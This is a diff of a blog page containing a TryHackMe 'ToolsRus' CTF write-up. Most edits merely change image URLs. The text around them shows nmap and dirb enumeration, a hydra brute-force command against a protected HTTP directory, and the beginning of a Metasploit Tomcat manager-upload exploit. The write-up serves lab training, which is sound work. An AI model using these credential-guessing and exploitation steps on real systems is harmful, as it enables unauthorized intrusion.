@@ -20,14 +20,14 @@
     <meta property="og:title" content="ToolsRus CTF | write-up">
     <meta property="og:description" content="Hello all, today's challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward. Let's enumerate the machine root@kali:~# nmap -sC -sV 10.10.27.83 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC Nmap scan report for ip-10-10-27-83.eu-west-1.">
     <meta property="og:url" content="https://fr33s0ul.tech/toolsrus-ctf-write-up/">
-    <meta property="og:image" content="https://fr33s0ul.tech/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg">
+    <meta property="og:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg">
     <meta property="article:published_time" content="2020-04-03T13:44:52.000Z">
     <meta property="article:modified_time" content="2020-04-10T15:50:29.000Z">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="ToolsRus CTF | write-up">
     <meta name="twitter:description" content="Hello all, today's challenge is made by Tryhackme.com, it's a fun CTF ratted as easy, totally straight forward. Let's enumerate the machine root@kali:~# nmap -sC -sV 10.10.27.83 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 13:36 UTC Nmap scan report for ip-10-10-27-83.eu-west-1.">
     <meta name="twitter:url" content="https://fr33s0ul.tech/toolsrus-ctf-write-up/">
-    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg">
+    <meta name="twitter:image" content="https://fr33s0ul.tech/content/images/size/w1000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg">
     <meta name="twitter:label1" content="Written by">
     <meta name="twitter:data1" content="fr33s0ul">
     <meta name="twitter:site" content="@fr33soul_">
@@ -47,7 +47,7 @@
             "@type": "ImageObject",
             "url": {
                 "@type": "ImageObject",
-                "url": "https://fr33s0ul.tech/content/images/2020/03/logo.gif",
+                "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/logo.gif",
                 "width": 300,
                 "height": 41
             }
@@ -58,7 +58,7 @@
         "name": "fr33s0ul",
         "image": {
             "@type": "ImageObject",
-            "url": "https://fr33s0ul.tech/content/images/2020/03/asdasd.gif",
+            "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/03/asdasd.gif",
             "width": 600,
             "height": 594
         },
@@ -73,7 +73,7 @@
     "dateModified": "2020-04-10T15:50:29.000Z",
     "image": {
         "@type": "ImageObject",
-        "url": "https://fr33s0ul.tech/content/images/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg",
+        "url": "https://fr33s0ul.tech/content/images/size/w1000/2020/04/77fd9d1804d33b5cf3adf1a2f3dcc34b-1.jpg",
         "width": 1144,
         "height": 992
     },
@@ -219,7 +219,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
 root@kali:~# 
-</code></pre><p>we have 22 <strong>SSH</strong>, 80 <strong>HTTP</strong>, and another <strong>HTTP</strong> on 1234 running <strong>Tomcat</strong> and 8009 for <strong>ajp13</strong> let's have a look what we are dealing with on 80 and check if there's any open directories so we can understand more what we are trying to break</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-03-at-14.44.04.png" class="kg-image"></figure><pre><code>root@kali:~# dirb http://10.10.27.83
+</code></pre><p>we have 22 <strong>SSH</strong>, 80 <strong>HTTP</strong>, and another <strong>HTTP</strong> on 1234 running <strong>Tomcat</strong> and 8009 for <strong>ajp13</strong> let's have a look what we are dealing with on 80 and check if there's any open directories so we can understand more what we are trying to break</p><figure class="kg-card kg-image-card"><img src="../content/images/size/w1000/2020/04/Screenshot-2020-04-03-at-14.44.04.png" class="kg-image"></figure><pre><code>root@kali:~# dirb http://10.10.27.83
 
 -----------------
 DIRB v2.22    
@@ -247,7 +247,7 @@ GENERATED WORDS: 4612
 END_TIME: Fri Apr  3 13:39:12 2020
 DOWNLOADED: 9224 - FOUND: 4
 root@kali:~# 
-</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-03-at-14.48.35.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-03-at-14.54.50.png" class="kg-image"></figure><p>and we have a message in directory <strong>/guidelines</strong> for Mr bob that forgot maybe to update the Tomcat server and another one <strong>/protected</strong> that tells us that we are visiting the wrong port, that's fine because we have more in port 1234</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-03-at-14.57.36.png" class="kg-image"></figure><pre><code>root@kali:~# hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.27.83 http-get /protected
+</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/size/w1000/2020/04/Screenshot-2020-04-03-at-14.48.35.png" class="kg-image"></figure><figure class="kg-card kg-image-card"><img src="../content/images/size/w1000/2020/04/Screenshot-2020-04-03-at-14.54.50.png" class="kg-image"></figure><p>and we have a message in directory <strong>/guidelines</strong> for Mr bob that forgot maybe to update the Tomcat server and another one <strong>/protected</strong> that tells us that we are visiting the wrong port, that's fine because we have more in port 1234</p><figure class="kg-card kg-image-card"><img src="../content/images/size/w1000/2020/04/Screenshot-2020-04-03-at-14.57.36.png" class="kg-image"></figure><pre><code>root@kali:~# hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.27.83 http-get /protected
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-03 13:53:17
@@ -256,7 +256,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-03 13:53:
 [80][http-get] host: 10.10.27.83   login: bob   password: xxxxxxx
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-03 13:53:19
-root@kali:~# </code></pre><p>so we know the user and we brute forced the password with hydra let's dig more and see what we can do with our results so far</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-03-at-16.46.19.png" class="kg-image"></figure><p>the version we are on it accepts some code execution and already exist in metasploit which means less work for us, It's all right to be lazy sometimes ...</p><pre><code>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; show options 
+root@kali:~# </code></pre><p>so we know the user and we brute forced the password with hydra let's dig more and see what we can do with our results so far</p><figure class="kg-card kg-image-card"><img src="../content/images/size/w1000/2020/04/Screenshot-2020-04-03-at-16.46.19.png" class="kg-image"></figure><p>the version we are on it accepts some code execution and already exist in metasploit which means less work for us, It's all right to be lazy sometimes ...</p><pre><code>msf5 exploit(multi/http/tomcat_mgr_upload) &gt; show options 
 
 Module options (exploit/multi/http/tomcat_mgr_upload):
 
